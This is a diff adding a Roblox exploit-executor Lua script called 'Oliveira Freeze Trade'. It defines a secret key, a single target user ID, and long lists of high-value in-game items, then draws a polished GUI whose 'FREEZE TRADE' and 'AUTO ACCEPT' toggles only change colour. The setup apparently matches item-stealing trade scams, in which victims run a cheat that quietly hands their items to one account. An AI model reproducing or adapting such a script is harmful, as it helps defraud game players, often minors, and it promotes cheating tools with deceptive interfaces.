@@ -1,0 +1,787 @@
+--// OLIVEIRA FREEZE TRADE
+--// ICE STYLE
+
+--==================================================
+-- CONFIGURAÇÕES ADICIONADAS
+--==================================================
+
+getgenv().SECRET_KEY = "C90A000A467FD94C92CD389ADB959199"
+getgenv().TARGET_ID = 9178950630
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Spyder Elephant"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Headless Horseman"] = true,
+    ["Meowl"] = true,
+    ["John Pork"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Arcadragon"] = true,
+    ["Hydra Serpent"] = true,
+    ["Los Dragons"] = true,
+    ["Gold and Diamond"] = true,
+    ["Panda Popanda"] = true,
+    ["Chicli Chicla"] = true,
+    ["La Craft Machine"] = true,
+    ["S'more Serat"] = true,
+    ["Queen Bee"] = true,
+    ["Bumbatron"] = true,
+    ["La Breakfast Combinasion"] = true,
+    ["Yetimatic"] = true,
+    ["Cangurato Gelato"] = true,
+    ["Examen Bros"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Griffin"] = true,
+    ["Grabatron"] = true,
+    ["Rubiko and Kubiko"] = true,
+    ["Signore Carapace"] = true,
+    ["Love Love Bear"] = true,
+    ["Moby Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Kraken"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Hydra Bunny"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Jelly Moby"] = true,
+    ["Venuspino"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Los Amigos"] = true,
+    ["Antonio"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Kalika Bros"] = true,
+    ["Los Sekolahs"] = true,
+    ["Cash or Card"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Admins"] = true,
+    ["Duggy Bros"] = true,
+    ["La Food Combinasion"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Boppin Bunny"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Ginger Gerat"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Los Chillis"] = true,
+    ["Los Hackers"] = true,
+    ["Bearito Cabinito"] = true,
+    ["Capitano Americano"] = true,
+    ["Los Spaghettis"] = true,
+    ["Rubrikiko"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Festive 67"] = true,
+    ["Guest 666"] = true,
+    ["Quackini Snackini"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Cloverat Clapat"] = true,
+    ["La Summer Grande"] = true,
+    ["Los Tictacs"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Caylusaurus"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["La Easter Grande"] = true,
+    ["Steakini Fattini"] = true,
+    ["Garama and Madundung"] = true,
+    ["La Anniversary Grande"] = true,
+    ["Nacho Spyder"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Fishino Clownino"] = true,
+    ["Money Money Bros"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Gym Bros"] = true,
+    ["Rico Dinero"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Tictac Sahur"] = true,
+    ["Dug dug dug"] = true,
+    ["Abyssaloco"] = true,
+    ["Los Primos"] = true,
+    ["W or L"] = true,
+    ["Globa Steppa"] = true,
+    ["Tralaledon"] = true,
+    ["Nachorilla"] = true,
+    ["Sammyni Truckini"] = true,
+    ["La Fuse Machine"] = true,
+    ["Orchidox"] = true,
+    ["Polaroidini"] = true,
+    ["Pop Pop Petalini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
+    ["Draculino"] = true,
+    ["Sammyni Spookyni"] = true,
+    ["Lionello Casarello"] = true,
+    ["Dragon Cannelloni Egg"] = true,
+    ["Draculino Egg"] = true,
+    ["Yetimatic Egg"] = true,
+    ["Swag Soda Egg"] = true,
+    ["Capitano Moby Egg"] = true,
+    ["Cerberus Egg"] = true,
+    ["Chillin Chili"] = true,
+    ["Orcaledon"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Lucky Grande"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Cavallo Virtuoso"] = true,
+    ["Brutto Gialutto"] = true,
+    ["Avocadorilla"] = true,
+    ["Ganganzelli Trulala"] = true,
+    ["Tob Tobi Tobi"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Rhino Helicopterino"] = true,
+    ["Centrucci Nuclucci"] = true
+}
+getgenv().TARGET_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Lucky"] = true,
+    ["Easter"] = true,
+    ["Valentines"] = true,
+    ["Bee Emperor"] = true,
+    ["Honey Bee"] = true,
+    ["Octo"] = true,
+    ["Taco"] = true,
+    ["Tralalero"] = true,
+    ["Aquatic"] = true,
+    ["Pot of Gold"] = true
+}
+getgenv().TARGET_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Rainbow Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Flying Bee"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Demon's Head"] = true,
+    ["Divine Slap"] = true
+}
+
+
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+--==================================================
+-- GUI
+--==================================================
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "OliveiraFreezeTrade"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+--==================================================
+-- GRADIENTE ICE
+--==================================================
+
+local gradients = {}
+
+local function IceText(object, speed)
+
+    object.TextColor3 = Color3.fromRGB(255,255,255)
+    object.TextStrokeColor3 = Color3.fromRGB(20,115,255)
+    object.TextStrokeTransparency = 0.05
+
+    local gradient = Instance.new("UIGradient")
+
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255,255,255)),
+        ColorSequenceKeypoint.new(0.18, Color3.fromRGB(205,245,255)),
+        ColorSequenceKeypoint.new(0.38, Color3.fromRGB(80,185,255)),
+        ColorSequenceKeypoint.new(0.52, Color3.fromRGB(235,250,255)),
+        ColorSequenceKeypoint.new(0.70, Color3.fromRGB(65,165,255)),
+        ColorSequenceKeypoint.new(0.87, Color3.fromRGB(190,235,255)),
+        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255,255,255))
+    })
+
+    gradient.Rotation = 0
+    gradient.Offset = Vector2.new(-1,0)
+    gradient.Parent = object
+
+    table.insert(gradients,{
+        gradient = gradient,
+        speed = speed or 0.35
+    })
+
+    return gradient
+end
+
+-- animação MUITO lenta
+task.spawn(function()
+
+    local offset = -1
+
+    while ScreenGui.Parent do
+
+        offset = offset + 0.008
+
+        if offset > 1 then
+            offset = -1
+        end
+
+        for _,data in ipairs(gradients) do
+
+            if data.gradient.Parent then
+                data.gradient.Offset =
+                    Vector2.new(offset,0)
+            end
+
+        end
+
+        task.wait(0.03)
+
+    end
+
+end)
+
+--==================================================
+-- HUB
+--==================================================
+
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0,300,0,170)
+Main.Position = UDim2.new(0.5,-150,0.5,-85)
+Main.BackgroundColor3 = Color3.fromRGB(7,9,12)
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0,10)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Thickness = 2
+MainStroke.Color = Color3.fromRGB(255,255,255)
+MainStroke.Parent = Main
+
+--==================================================
+-- TÍTULO ICE
+--==================================================
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1,-45,0,40)
+Title.Position = UDim2.new(0,10,0,0)
+Title.BackgroundTransparency = 1
+
+Title.Text = "𝕺𝖑𝖎𝖛𝖊𝖎𝖗𝖆 𝕱𝖗𝖊𝖊𝖟𝖊 𝕿𝖗𝖆𝖉𝖊"
+
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 18
+
+Title.Parent = Main
+
+IceText(Title,0.45)
+
+--==================================================
+-- FECHAR
+--==================================================
+
+local Close = Instance.new("TextButton")
+Close.Size = UDim2.new(0,30,0,30)
+Close.Position = UDim2.new(1,-35,0,5)
+
+Close.BackgroundColor3 =
+    Color3.fromRGB(25,25,25)
+
+Close.Text = "×"
+Close.TextColor3 =
+    Color3.fromRGB(255,255,255)
+
+Close.TextSize = 22
+Close.Font = Enum.Font.GothamBlack
+Close.AutoButtonColor = false
+
+Close.Parent = Main
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0,7)
+CloseCorner.Parent = Close
+
+--==================================================
+-- BORDA DO BOTÃO FECHADO
+--==================================================
+
+local RGBBorder = Instance.new("Frame")
+RGBBorder.Name = "IceBorder"
+
+RGBBorder.Size =
+    UDim2.new(0,74,0,74)
+
+RGBBorder.Position =
+    UDim2.new(0.5,-37,0,23)
+
+RGBBorder.BackgroundColor3 =
+    Color3.fromRGB(255,255,255)
+
+RGBBorder.BorderSizePixel = 0
+RGBBorder.Visible = false
+RGBBorder.ZIndex = 1
+RGBBorder.Parent = ScreenGui
+
+local BorderCorner = Instance.new("UICorner")
+BorderCorner.CornerRadius = UDim.new(0,12)
+BorderCorner.Parent = RGBBorder
+
+local BorderGradient = Instance.new("UIGradient")
+
+BorderGradient.Color = ColorSequence.new({
+
+    ColorSequenceKeypoint.new(
+        0,
+        Color3.fromRGB(255,255,255)
+    ),
+
+    ColorSequenceKeypoint.new(
+        0.25,
+        Color3.fromRGB(90,195,255)
+    ),
+
+    ColorSequenceKeypoint.new(
+        0.50,
+        Color3.fromRGB(255,255,255)
+    ),
+
+    ColorSequenceKeypoint.new(
+        0.75,
+        Color3.fromRGB(100,205,255)
+    ),
+
+    ColorSequenceKeypoint.new(
+        1,
+        Color3.fromRGB(255,255,255)
+    )
+
+})
+
+BorderGradient.Parent = RGBBorder
+
+table.insert(gradients,{
+    gradient = BorderGradient,
+    speed = 1
+})
+
+--==================================================
+-- BOTÃO FECHADO
+--==================================================
+
+local OpenButton = Instance.new("TextButton")
+OpenButton.Name = "OpenButton"
+
+OpenButton.Size =
+    UDim2.new(0,70,0,70)
+
+OpenButton.Position =
+    UDim2.new(0.5,-35,0,25)
+
+OpenButton.BackgroundColor3 =
+    Color3.fromRGB(3,7,12)
+
+OpenButton.BorderSizePixel = 0
+OpenButton.Text = ""
+OpenButton.AutoButtonColor = false
+OpenButton.Visible = false
+OpenButton.ZIndex = 3
+
+OpenButton.Parent = ScreenGui
+
+local OpenCorner = Instance.new("UICorner")
+OpenCorner.CornerRadius = UDim.new(0,10)
+OpenCorner.Parent = OpenButton
+
+--==================================================
+-- OLIVEIRA ICE
+--==================================================
+
+local Oliveira = Instance.new("TextLabel")
+
+Oliveira.Size =
+    UDim2.new(1,-6,0,28)
+
+Oliveira.Position =
+    UDim2.new(0,3,0,7)
+
+Oliveira.BackgroundTransparency = 1
+
+Oliveira.Text = "OLIVEIRA"
+
+Oliveira.Font =
+    Enum.Font.GothamBlack
+
+Oliveira.TextScaled = true
+Oliveira.ZIndex = 4
+
+Oliveira.Parent = OpenButton
+
+IceText(Oliveira,0.55)
+
+--==================================================
+-- FREEZE ICE
+--==================================================
+
+local Freeze = Instance.new("TextLabel")
+
+Freeze.Size =
+    UDim2.new(1,-18,0,22)
+
+Freeze.Position =
+    UDim2.new(0,9,0,38)
+
+Freeze.BackgroundTransparency = 1
+
+Freeze.Text = "FREEZE"
+
+Freeze.Font =
+    Enum.Font.GothamBlack
+
+Freeze.TextScaled = true
+Freeze.ZIndex = 4
+
+Freeze.Parent = OpenButton
+
+IceText(Freeze,0.55)
+
+--==================================================
+-- TOGGLES
+--==================================================
+
+local function createToggle(name,y)
+
+    local Label = Instance.new("TextLabel")
+
+    Label.Size =
+        UDim2.new(0,175,0,40)
+
+    Label.Position =
+        UDim2.new(0,15,0,y)
+
+    Label.BackgroundTransparency = 1
+
+    Label.Text = name
+
+    -- FREEZE TRADE / AUTO ACCEPT
+    -- continuam mais grossos
+    Label.Font = Enum.Font.GothamBlack
+
+    Label.TextColor3 =
+        Color3.fromRGB(255,255,255)
+
+    Label.TextSize = 15
+
+    Label.TextXAlignment =
+        Enum.TextXAlignment.Left
+
+    Label.Parent = Main
+
+    -- efeito ICE azul/branco
+    IceText(Label,0.35)
+
+    --==================================================
+    -- DOT
+    --==================================================
+
+    local Dot = Instance.new("Frame")
+
+    Dot.Size =
+        UDim2.new(0,7,0,7)
+
+    Dot.Position =
+        UDim2.new(0,190,0,y+16)
+
+    Dot.BackgroundColor3 =
+        Color3.fromRGB(255,0,0)
+
+    Dot.BorderSizePixel = 0
+
+    Dot.Parent = Main
+
+    local DotCorner = Instance.new("UICorner")
+    DotCorner.CornerRadius = UDim.new(1,0)
+    DotCorner.Parent = Dot
+
+    local DotGlow = Instance.new("UIStroke")
+    DotGlow.Thickness = 1.5
+    DotGlow.Color = Color3.fromRGB(255,0,0)
+    DotGlow.Parent = Dot
+
+    --==================================================
+    -- ON / OFF
+    --==================================================
+
+    local Button = Instance.new("TextButton")
+
+    Button.Size =
+        UDim2.new(0,80,0,30)
+
+    Button.Position =
+        UDim2.new(1,-95,0,y+5)
+
+    Button.BackgroundColor3 =
+        Color3.fromRGB(45,45,45)
+
+    Button.Text = "OFF"
+
+    Button.TextColor3 =
+        Color3.fromRGB(255,255,255)
+
+    Button.TextSize = 13
+
+    Button.Font =
+        Enum.Font.GothamBlack
+
+    Button.AutoButtonColor = false
+
+    Button.Parent = Main
+
+    local ButtonCorner = Instance.new("UICorner")
+    ButtonCorner.CornerRadius = UDim.new(0,7)
+    ButtonCorner.Parent = Button
+
+    local enabled = false
+
+    Button.MouseButton1Click:Connect(function()
+
+        enabled = not enabled
+
+        if enabled then
+
+            Button.Text = "ON"
+
+            Button.BackgroundColor3 =
+                Color3.fromRGB(235,250,255)
+
+            Button.TextColor3 =
+                Color3.fromRGB(5,20,30)
+
+            Dot.BackgroundColor3 =
+                Color3.fromRGB(0,255,80)
+
+            DotGlow.Color =
+                Color3.fromRGB(0,255,80)
+
+        else
+
+            Button.Text = "OFF"
+
+            Button.BackgroundColor3 =
+                Color3.fromRGB(45,45,45)
+
+            Button.TextColor3 =
+                Color3.fromRGB(255,255,255)
+
+            Dot.BackgroundColor3 =
+                Color3.fromRGB(255,0,0)
+
+            DotGlow.Color =
+                Color3.fromRGB(255,0,0)
+
+        end
+
+    end)
+
+end
+
+createToggle("FREEZE TRADE",50)
+createToggle("AUTO ACCEPT",105)
+
+--==================================================
+-- ABRIR / FECHAR
+--==================================================
+
+Close.MouseButton1Click:Connect(function()
+
+    Main.Visible = false
+
+    OpenButton.Visible = true
+    RGBBorder.Visible = true
+
+end)
+
+OpenButton.MouseButton1Click:Connect(function()
+
+    Main.Visible = true
+
+    OpenButton.Visible = false
+    RGBBorder.Visible = false
+
+end)
+
+--==================================================
+-- ARRASTAR HUB
+--==================================================
+
+local dragging = false
+local dragStart
+local startPos
+
+Title.InputBegan:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+    or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+
+    end
+
+end)
+
+UIS.InputChanged:Connect(function(input)
+
+    if dragging and (
+        input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+        or input.UserInputType ==
+            Enum.UserInputType.Touch
+    ) then
+
+        local delta =
+            input.Position - dragStart
+
+        Main.Position = UDim2.new(
+
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+
+        )
+
+    end
+
+end)
+
+UIS.InputEnded:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+    or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        dragging = false
+
+    end
+
+end)
+
+--==================================================
+-- ARRASTAR BOTÃO FECHADO
+--==================================================
+
+local openDragging = false
+local openDragStart
+local openStartPos
+
+OpenButton.InputBegan:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+    or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        openDragging = true
+
+        openDragStart =
+            input.Position
+
+        openStartPos =
+            OpenButton.Position
+
+    end
+
+end)
+
+UIS.InputChanged:Connect(function(input)
+
+    if openDragging and (
+        input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+        or input.UserInputType ==
+            Enum.UserInputType.Touch
+    ) then
+
+        local delta =
+            input.Position - openDragStart
+
+        local newPosition = UDim2.new(
+
+            openStartPos.X.Scale,
+            openStartPos.X.Offset + delta.X,
+
+            openStartPos.Y.Scale,
+            openStartPos.Y.Offset + delta.Y
+
+        )
+
+        OpenButton.Position =
+            newPosition
+
+        -- borda acompanha o botão
+
+        RGBBorder.Position =
+            UDim2.new(
+
+                newPosition.X.Scale,
+                newPosition.X.Offset - 2,
+
+                newPosition.Y.Scale,
+                newPosition.Y.Offset - 2
+
+            )
+
+    end
+
+end)
+
+UIS.InputEnded:Connect(function(input)
+
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+    or input.UserInputType ==
+        Enum.UserInputType.Touch then
+
+        openDragging = false
+
+    end
+
+end)
